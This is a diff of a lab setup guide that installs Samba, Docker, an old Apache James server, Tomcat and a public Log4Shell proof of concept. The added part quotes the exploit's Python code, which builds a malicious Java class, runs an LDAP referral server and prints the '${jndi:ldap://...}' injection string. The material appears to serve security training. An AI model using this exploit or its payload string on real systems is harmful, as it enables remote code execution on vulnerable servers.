@@ -3,11 +3,11 @@
 
 ```
 #!/bin/bash
-sudo apt update
+sudo apt update 
+sudo apt install openjdk-8-jdk -y
 #Samba
 echo "*********Install samba*********"
 sudo apt install samba -y
-#sudo systemctl status smbd
 sudo mkdir -p /samba
 sudo ufw allow samba
 echo "*******samba done**********"
@@ -26,31 +26,27 @@ sudo apt update
 sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin -y
 sudo usermod -aG docker ${USER}
 echo "*********docker is done**********"
+
 echo "*********install james server********"
 sudo apt install bash-completion  
 curl -O https://archive.apache.org/dist/james/server/apache-james-2.3.2.tar.gz
 tar -xzf apache-james-2.3.2.tar.gz
 sudo cp -r james-2.3.2 /opt
 sudo chmod +x /opt/james-2.3.2/bin/*.sh
-curl -O https://repo.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-i586.tar.gz  
-tar -xf jdk-8u202-linux-i586.tar.gz 
-sudo mv jdk1.8.0_202 /opt/james-2.3.2/bin/
 echo "***********james server done **********"
+
 #Tomcat
 echo "********About to install apache tomcat***"
 curl -O https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.71/bin/apache-tomcat-9.0.71.tar.gz
 tar -xf apache-tomcat-9.0.71.tar.gz
 sudo mv apache-tomcat-9.0.71 /opt
 echo "apache tomcat is done"
+
 #Log4j PoC
 echo "*********log4j poc************"
 mkdir ~/mylog4j
 git clone https://github.com/kozmer/log4j-shell-poc.git
-sudo mv log4j-shell-poc ~/mylog4j
-curl -O https://repo.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-i586.tar.gz  
-tar -xf jdk-8u202-linux-i586.tar.gz 
-mv  jdk1.8.0_202  jdk1.8.0_20
-sudo mv jdk1.8.0_20 ~/mylog4j/log4j-shell-poc
+sudo mv log4j-shell-poc ~/mylog4j  
 cd ~/mylog4j/log4j-shell-poc
 sudo apt install python3-pip
 pip install -r requirements.txt
@@ -59,11 +55,18 @@ echo "*******log4j poc done*******"
 
 # Configure the James Server Phonix.sh script 
 ```
+export JAVA_HOME="/usr/lib/jvm/java-8-openjdk-amd64"
+export JAVA_HOME
+PATH=$PATH:$JAVA_HOME/bin
+export PATH
+Or copy the above command to you .profile file run source .profile
+Run echo $PATH to ensure that JAVA_HOME is part of the path.
+
 cd /opt/james-2.3.2/bin
-open the phonix.sh file and set the JAVA_HOME as shown below in RED:
+open the phonix.sh file and set the JAVA_HOME:
 
 ...
-JAVA_HOME="jdk1.8.0_20"
+JAVA_HOME="/usr/lib/jvm/java-8-openjdk-amd64"
 usage()
 {
     echo "Usage: $0 {start|stop|run|restart|check}"
@@ -118,6 +121,49 @@ sudo ./startapache.sh
 ```
 
 # Log4j PoC
+
+Modify the poc.py file to point to the jAVA_HOME as follows:
+
+…
+#!/usr/bin/env python3
+    try:
+        p.write_text(program)
+        subprocess.run([os.path.join(CUR_FOLDER, "/usr/lib/jvm/java-8-openjdk-amd64/bin/javac"), str(p)])
+    except OSError as e:
+        print(Fore.RED + f'[-] Something went wrong {e}')
+        raise e
+    else:
+        print(Fore.GREEN + '[+] Exploit java class created success')
+def payload(userip: str, webport: int, lport: int) -> None:
+    generate_payload(userip, lport)
+    print(Fore.GREEN + '[+] Setting up LDAP server\n')
+    # create the LDAP server on new thread
+    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
+    t1.start()
+    # start the web server
+    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
+    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
+    httpd.serve_forever()
+def check_java() -> bool:
+    exit_code = subprocess.call([
+        os.path.join(CUR_FOLDER, '/usr/lib/jvm/java-8-openjdk-amd64/bin/java'),
+        '-version',
+    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+    return exit_code == 0
+
+
+def ldap_server(userip: str, lport: int) -> None:
+    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
+    print(Fore.GREEN + f"[+] Send me: {sendme}\n")
+    url = "http://{}:{}/#Exploit".format(userip, lport)
+    subprocess.run([
+        os.path.join(CUR_FOLDER, "/usr/lib/jvm/java-8-openjdk-amd64/bin/java"),
+        "-cp",
+        os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
+        "marshalsec.jndi.LDAPRefServer",
+        url,
+    ])
+…
 
 Run the payload generator to generate payload script
 
